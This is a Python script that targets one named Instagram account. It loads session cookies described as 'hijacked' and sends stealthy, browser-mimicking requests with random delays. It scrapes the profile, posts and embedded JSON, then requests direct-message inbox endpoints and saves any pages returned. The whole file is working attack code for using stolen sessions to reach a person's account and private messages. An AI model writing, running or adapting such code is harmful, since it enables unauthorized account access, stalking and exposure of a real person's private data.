#!/usr/bin/env python3
"""
🌸 WEB SCRAPING ALX.TRADING EXTRACTOR
Direct web interface scraping with stealth
สำหรับ scraping profile และ DMs จาก alx.trading 💕
"""

import json
import os
import time
import random
import requests
from bs4 import BeautifulSoup
import re
from datetime import datetime

class WebScrapingAlxExtractor:
    def __init__(self):
        self.target = "alx.trading"
        self.output_dir = "/workspaces/sugarglitch-realops/data/web_scraping_extraction"
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Load hijacked session
        self.session_data = self.load_hijacked_session()
        self.session = self.create_session()
        
        # Results
        self.profile_data = {}
        self.posts = []
        self.followers_data = []
        
        print("🌸" * 50)
        print("💕 WEB SCRAPING ALX.TRADING EXTRACTOR")
        print("🌸" * 50)
        
    def load_hijacked_session(self):
        """Load the best hijacked session"""
        hijacked_dir = "/workspaces/sugarglitch-realops/hijacked_sessions"
        
        # Find the newest fresh session
        fresh_files = [f for f in os.listdir(hijacked_dir) if f.startswith("fresh_hijacked_session_")]
        if not fresh_files:
            return None
            
        fresh_files.sort(reverse=True)
        
        try:
            with open(os.path.join(hijacked_dir, fresh_files[0]), 'r') as f:
                session = json.load(f)
                print(f"✅ Loaded session: {fresh_files[0]}")
                return session
        except:
            return None
    
    def create_session(self):
        """Create a requests session with proper headers and cookies"""
        session = requests.Session()
        
        # Ultra-realistic headers
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9,th;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        })
        
        # Add hijacked cookies
        if self.session_data and 'cookies' in self.session_data:
            for cookie in self.session_data['cookies']:
                session.cookies.set(
                    cookie['name'],
                    cookie['value'],
                    domain=cookie.get('domain', '.instagram.com'),
                    path=cookie.get('path', '/')
                )
        
        return session
    
    def extract_profile_page(self):
        """Extract data from the profile page"""
        print(f"\n🎯 Extracting profile: @{self.target}")
        print("=" * 40)
        
        url = f"https://www.instagram.com/{self.target}/"
        
        try:
            # Add random delay
            time.sleep(random.uniform(2, 4))
            
            response = self.session.get(url, timeout=30)
            print(f"Status: {response.status_code}")
            
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Save raw HTML for analysis
                html_file = os.path.join(self.output_dir, f"{self.target}_profile.html")
                with open(html_file, 'w', encoding='utf-8') as f:
                    f.write(response.text)
                
                # Extract JSON data from script tags
                self.extract_json_data(soup)
                
                # Extract visible profile info
                self.extract_visible_profile_info(soup)
                
                print("✅ Profile page extracted")
                
            else:
                print(f"❌ Profile access failed: {response.status_code}")
                
        except Exception as e:
            print(f"❌ Error: {e}")
    
    def extract_json_data(self, soup):
        """Extract JSON data from script tags"""
        print("🔍 Looking for embedded JSON data...")
        
        script_tags = soup.find_all('script', type='text/javascript')
        
        for script in script_tags:
            if script.string:
                # Look for common Instagram data patterns
                if 'window._sharedData' in script.string:
                    try:
                        # Extract _sharedData
                        start = script.string.find('window._sharedData = ') + len('window._sharedData = ')
                        end = script.string.find(';</script>', start)
                        if end == -1:
                            end = script.string.find(';', start)
                        
                        json_str = script.string[start:end]
                        data = json.loads(json_str)
                        
                        self.process_shared_data(data)
                        
                        # Save raw data
                        shared_data_file = os.path.join(self.output_dir, f"{self.target}_shared_data.json")
                        with open(shared_data_file, 'w') as f:
                            json.dump(data, f, indent=2)
                        
                        print("✅ Found window._sharedData")
                        
                    except json.JSONDecodeError:
                        continue
                
                # Look for other JSON patterns
                if '"graphql"' in script.string and self.target in script.string:
                    try:
                        # Try to extract GraphQL data
                        json_matches = re.findall(r'\{.*?"graphql".*?\}', script.string)
                        for match in json_matches:
                            try:
                                data = json.loads(match)
                                
                                graphql_file = os.path.join(self.output_dir, f"{self.target}_graphql_{len(json_matches)}.json")
                                with open(graphql_file, 'w') as f:
                                    json.dump(data, f, indent=2)
                                
                                print(f"✅ Found GraphQL data chunk {len(json_matches)}")
                            except:
                                continue
                    except:
                        continue
    
    def process_shared_data(self, data):
        """Process Instagram shared data"""
        try:
            if 'entry_data' in data and 'ProfilePage' in data['entry_data']:
                profile_page = data['entry_data']['ProfilePage'][0]
                
                if 'graphql' in profile_page and 'user' in profile_page['graphql']:
                    user = profile_page['graphql']['user']
                    
                    self.profile_data = {
                        'username': user.get('username'),
                        'full_name': user.get('full_name'),
                        'biography': user.get('biography'),
                        'follower_count': user.get('edge_followed_by', {}).get('count', 0),
                        'following_count': user.get('edge_follow', {}).get('count', 0),
                        'post_count': user.get('edge_owner_to_timeline_media', {}).get('count', 0),
                        'is_private': user.get('is_private', False),
                        'is_verified': user.get('is_verified', False),
                        'profile_pic_url': user.get('profile_pic_url_hd'),
                        'external_url': user.get('external_url'),
                        'extracted_at': datetime.now().isoformat()
                    }
                    
                    print(f"✅ Profile data extracted:")
                    print(f"   Username: {self.profile_data['username']}")
                    print(f"   Full name: {self.profile_data['full_name']}")
                    print(f"   Followers: {self.profile_data['follower_count']}")
                    print(f"   Posts: {self.profile_data['post_count']}")
                    print(f"   Private: {self.profile_data['is_private']}")
                    
                    # Extract posts if available
                    if 'edge_owner_to_timeline_media' in user and 'edges' in user['edge_owner_to_timeline_media']:
                        self.extract_posts(user['edge_owner_to_timeline_media']['edges'])
                        
        except Exception as e:
            print(f"❌ Error processing shared data: {e}")
    
    def extract_posts(self, post_edges):
        """Extract post data"""
        print(f"📸 Extracting {len(post_edges)} posts...")
        
        for edge in post_edges:
            try:
                node = edge['node']
                
                post = {
                    'id': node.get('id'),
                    'shortcode': node.get('shortcode'),
                    'caption': '',
                    'like_count': node.get('edge_liked_by', {}).get('count', 0),
                    'comment_count': node.get('edge_media_to_comment', {}).get('count', 0),
                    'timestamp': node.get('taken_at_timestamp'),
                    'display_url': node.get('display_url'),
                    'is_video': node.get('is_video', False)
                }
                
                # Extract caption
                if 'edge_media_to_caption' in node and 'edges' in node['edge_media_to_caption']:
                    caption_edges = node['edge_media_to_caption']['edges']
                    if caption_edges:
                        post['caption'] = caption_edges[0]['node'].get('text', '')
                
                self.posts.append(post)
                
            except Exception as e:
                print(f"❌ Error extracting post: {e}")
                continue
        
        print(f"✅ Extracted {len(self.posts)} posts")
    
    def extract_visible_profile_info(self, soup):
        """Extract visible profile information"""
        print("🔍 Extracting visible profile elements...")
        
        try:
            # Look for meta tags
            meta_description = soup.find('meta', {'name': 'description'})
            if meta_description:
                content = meta_description.get('content', '')
                print(f"   Meta description: {content[:100]}...")
                
            # Look for JSON-LD structured data
            json_ld = soup.find('script', {'type': 'application/ld+json'})
            if json_ld:
                try:
                    ld_data = json.loads(json_ld.string)
                    print(f"   JSON-LD found: {list(ld_data.keys())}")
                    
                    # Save JSON-LD data
                    ld_file = os.path.join(self.output_dir, f"{self.target}_jsonld.json")
                    with open(ld_file, 'w') as f:
                        json.dump(ld_data, f, indent=2)
                        
                except:
                    pass
            
            # Look for any text containing numbers (could be stats)
            text_elements = soup.find_all(text=re.compile(r'\d+'))
            numbers_found = []
            for text in text_elements:
                text = text.strip()
                if text and any(char.isdigit() for char in text):
                    numbers_found.append(text)
            
            if numbers_found:
                print(f"   Numbers found: {numbers_found[:10]}")  # Show first 10
                
        except Exception as e:
            print(f"❌ Error extracting visible info: {e}")
    
    def try_direct_message_endpoints(self):
        """Try to access direct message endpoints"""
        print("\n💌 Attempting DM access...")
        print("=" * 40)
        
        dm_endpoints = [
            "https://www.instagram.com/direct/inbox/",
            "https://www.instagram.com/direct/t/",
            f"https://www.instagram.com/{self.target}/direct/"
        ]
        
        for endpoint in dm_endpoints:
            try:
                time.sleep(random.uniform(1, 3))
                
                response = self.session.get(endpoint, timeout=20)
                print(f"🔍 {endpoint}: {response.status_code}")
                
                if response.status_code == 200:
                    # Save the page for analysis
                    filename = endpoint.split('/')[-2] if endpoint.endswith('/') else endpoint.split('/')[-1]
                    if not filename:
                        filename = "inbox"
                    
                    dm_file = os.path.join(self.output_dir, f"dm_{filename}.html")
                    with open(dm_file, 'w', encoding='utf-8') as f:
                        f.write(response.text)
                    
                    print(f"   ✅ Saved to: dm_{filename}.html")
                    
                    # Quick analysis
                    soup = BeautifulSoup(response.text, 'html.parser')
                    scripts = soup.find_all('script')
                    print(f"   📄 Found {len(scripts)} script tags")
                    
                elif response.status_code == 302:
                    print(f"   🔄 Redirect detected")
                else:
                    print(f"   ❌ Access denied")
                    
            except Exception as e:
                print(f"   ❌ Error: {e}")
    
    def save_results(self):
        """Save all extraction results"""
        timestamp = int(time.time())
        
        # Comprehensive report
        report = {
            "target": self.target,
            "extraction_time": datetime.now().isoformat(),
            "profile_data": self.profile_data,
            "posts_count": len(self.posts),
            "posts": self.posts[:10],  # Save first 10 posts in report
            "extraction_method": "web_scraping"
        }
        
        report_file = os.path.join(self.output_dir, f"web_scraping_report_{timestamp}.json")
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        # Save all posts separately
        if self.posts:
            posts_file = os.path.join(self.output_dir, f"all_posts_{timestamp}.json")
            with open(posts_file, 'w') as f:
                json.dump(self.posts, f, indent=2)
        
        print(f"✅ Results saved to: {self.output_dir}")
        
        return report_file
    
    def run(self):
        """Run the complete web scraping extraction"""
        print(f"🚀 Starting web scraping for @{self.target}")
        
        # Extract profile page
        self.extract_profile_page()
        
        # Try DM endpoints
        self.try_direct_message_endpoints()
        
        # Save results
        report_file = self.save_results()
        
        # Final summary
        print("\n🌸 WEB SCRAPING COMPLETE 🌸")
        print("=" * 50)
        print(f"🎯 Target: @{self.target}")
        print(f"👤 Profile extracted: {'✅' if self.profile_data else '❌'}")
        print(f"📸 Posts found: {len(self.posts)}")
        print(f"📁 Output directory: {self.output_dir}")
        print(f"📋 Report: {os.path.basename(report_file)}")
        
        if self.profile_data:
            print(f"\n💫 Profile Summary:")
            print(f"   Username: {self.profile_data.get('username', 'N/A')}")
            print(f"   Full name: {self.profile_data.get('full_name', 'N/A')}")
            print(f"   Followers: {self.profile_data.get('follower_count', 'N/A')}")
            print(f"   Posts: {self.profile_data.get('post_count', 'N/A')}")
            print(f"   Private: {self.profile_data.get('is_private', 'N/A')}")

if __name__ == "__main__":
    extractor = WebScrapingAlxExtractor()
    extractor.run()
